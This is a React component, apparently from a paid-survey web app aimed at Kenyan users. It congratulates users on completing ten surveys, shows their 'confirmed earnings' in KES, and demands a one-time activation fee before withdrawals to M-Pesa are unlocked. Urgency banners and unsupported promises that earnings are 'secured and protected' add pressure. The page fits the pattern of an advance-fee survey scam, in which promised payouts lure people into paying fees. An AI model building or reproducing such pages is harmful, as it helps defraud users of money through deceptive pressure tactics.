import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../api/api";

/* =========================
   PLAN CONFIG (DISPLAY ONLY)
========================= */
const PLAN_CONFIG = {
  REGULAR: {
    label: "Regular",
    activationFee: 100,
    color: "#00e676",
    glow: "rgba(0,230,118,0.7)",
  },
  VIP: {
    label: "VIP",
    activationFee: 150,
    color: "#ffd600",
    glow: "rgba(255,214,0,0.8)",
  },
  VVIP: {
    label: "VVIP",
    activationFee: 200,
    color: "#ff5252",
    glow: "rgba(255,82,82,0.8)",
  },
};

const TOTAL_SURVEYS = 10;

export default function ActivationNotice() {
  const navigate = useNavigate();

  const [planKey, setPlanKey] = useState(null);
  const [planState, setPlanState] = useState(null);
  const [totalEarned, setTotalEarned] = useState(0);
  const [loading, setLoading] = useState(true);

  /* =========================
     LOAD STATE (BACKEND = LAW)
  ========================= */
  useEffect(() => {
    let alive = true;

    const load = async () => {
      try {
        const res = await api.get("/auth/me");

        const activePlan = res.data.active_plan;
        const plan = res.data.plans?.[activePlan];

        if (!activePlan || !plan) {
          navigate("/dashboard", { replace: true });
          return;
        }

        if (plan.surveys_completed < TOTAL_SURVEYS) {
          navigate("/dashboard", { replace: true });
          return;
        }

        if (plan.is_activated) {
          navigate("/dashboard?activated=true", { replace: true });
          return;
        }

        if (!alive) return;

        setPlanKey(activePlan);
        setPlanState(plan);
        setTotalEarned(res.data.total_earned);
      } catch {
        // handled globally
      } finally {
        if (alive) setLoading(false);
      }
    };

    load();
    return () => (alive = false);
  }, [navigate]);

  if (loading) {
    return <p style={{ textAlign: "center", marginTop: 80 }}>Loading…</p>;
  }

  if (!planKey || !planState) return null;

  const plan = PLAN_CONFIG[planKey];

  const handleActivate = () => {
    navigate("/activate");
  };

  return (
    <div style={page}>
      <div style={{ ...card, boxShadow: `0 0 60px ${plan.glow}` }}>
        <div style={flagWrap}>
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Kenya.svg"
            alt="Kenya Flag"
            style={flag}
          />
        </div>

        <h2 style={{ color: plan.color, textShadow: `0 0 20px ${plan.glow}` }}>
          🎉 Congratulations! 🎉
        </h2>

        <p style={text}>
          You have successfully completed all required surveys under the{" "}
          <b>{plan.label}</b> plan.
          <br /><br />
          Your total confirmed earnings are:
          <br />
          <b style={{ color: plan.color, fontSize: 18 }}>
            KES {totalEarned}
          </b>
          <br /><br />
          Activate your account now to unlock withdrawals directly to
          <b style={{ color: "#00e676" }}> M-Pesa</b>.
        </p>

        <div style={urgencyBox}>
          ⏳ Action Required: Activate your account to secure and withdraw your
          earnings
        </div>

        <div style={highlightBox}>
          <p>
            💼 <b>Account Status:</b>{" "}
            <span style={{ color: "#ffd600" }}>Pending Activation</span>
          </p>

          <p>
            💰 <b>Earnings Available:</b>{" "}
            <span style={{ color: plan.color }}>
              KES {totalEarned}
            </span>
          </p>

          <p>
            🔐 <b>One-Time Activation Fee:</b>{" "}
            <span style={{ color: "#ff5252" }}>
              KES {plan.activationFee}
            </span>
          </p>

          <p>✅ Instant withdrawals after activation</p>
          <p>🛡️ Your earnings are secured and protected</p>
          <p>📲 Withdraw to M-Pesa anytime after activation</p>
        </div>

        <button
          style={{
            ...activateBtn,
            background: "linear-gradient(135deg, #e60000, #ffeb3b)",
            boxShadow: "0 0 40px rgba(255,235,59,0.9)",
          }}
          onClick={handleActivate}
        >
          🔓 Activate Account & Withdraw Earnings
        </button>

        <button style={backBtn} onClick={() => navigate("/dashboard")}>
          Return to Dashboard
        </button>
      </div>
    </div>
  );
}

/* =========================
   STYLES
========================= */
const page = {
  minHeight: "100vh",
  background: "linear-gradient(135deg, #000, #0b3d2e, #000)",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
  padding: 20,
};

const card = {
  maxWidth: 520,
  width: "100%",
  background: "rgba(0,0,0,0.92)",
  padding: 28,
  borderRadius: 28,
  textAlign: "center",
  color: "#fff",
  border: "2px solid rgba(0,230,118,0.3)",
};

const flagWrap = { display: "flex", justifyContent: "center" };

const flag = {
  width: 64,
  height: 64,
  borderRadius: "50%",
  boxShadow: "0 0 20px rgba(255,255,255,0.6)",
};

const text = { marginTop: 14, fontSize: 15, lineHeight: 1.6 };

const urgencyBox = {
  marginTop: 16,
  padding: 14,
  borderRadius: 14,
  background: "rgba(255,0,0,0.2)",
  color: "#ff5252",
  fontWeight: 900,
};

const highlightBox = {
  marginTop: 22,
  padding: 18,
  borderRadius: 18,
  background: "rgba(0,230,118,0.1)",
  textAlign: "left",
  border: "1px solid rgba(0,230,118,0.4)",
};

const activateBtn = {
  width: "100%",
  marginTop: 26,
  padding: 18,
  color: "#000",
  border: "none",
  borderRadius: 999,
  fontWeight: 900,
  cursor: "pointer",
  fontSize: 16,
};

const backBtn = {
  width: "100%",
  marginTop: 12,
  padding: 13,
  background: "rgba(255,255,255,0.1)",
  color: "#fff",
  border: "1px solid rgba(255,255,255,0.3)",
  borderRadius: 999,
  cursor: "pointer",
};